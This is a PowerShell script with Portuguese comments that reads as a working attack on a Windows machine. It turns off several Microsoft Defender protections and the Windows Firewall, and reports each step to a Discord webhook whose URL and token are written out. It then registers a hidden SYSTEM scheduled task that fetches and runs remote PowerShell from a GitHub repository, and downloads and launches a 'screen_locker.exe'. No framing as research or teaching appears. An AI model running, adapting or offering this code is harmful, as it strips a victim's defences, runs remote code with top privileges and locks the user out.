# ---------- Função de webhook com log ----------
function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $logFile = "$env:TEMP\webhook_log.txt"
    try {
        $payload = @{ content = $Message } | ConvertTo-Json -Compress
        $result = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
        Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] OK: $Message"
    } catch {
        Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FAIL: $Message - $_"
    }
}

# Etapas com notificação
Send-DiscordWebhook "🛡️ Desativando proteção contra bloqueio à primeira vista (1/7)"
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando proteção IOAV (2/7)"
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/7)"
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando envio automático de amostras (4/7)"
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando MAPS (5/7)"
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🔥 Desligando Firewall do Windows (6/7)"
netsh advfirewall set allprofiles state off

Send-DiscordWebhook "📅 Handshake + Agendamento + Screen Locker (7/7)"
$handshakeFile = "$env:TEMP\handshake_restore.txt"
"restore_pending" | Out-File -FilePath $handshakeFile -Force

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/enable_all.ps1' -UseBasicParsing).Content`""
$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(30))
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "RestoreDefenses" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

$lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
$lockerPath = "$env:TEMP\screen_locker.exe"
(New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
Start-Process $lockerPath
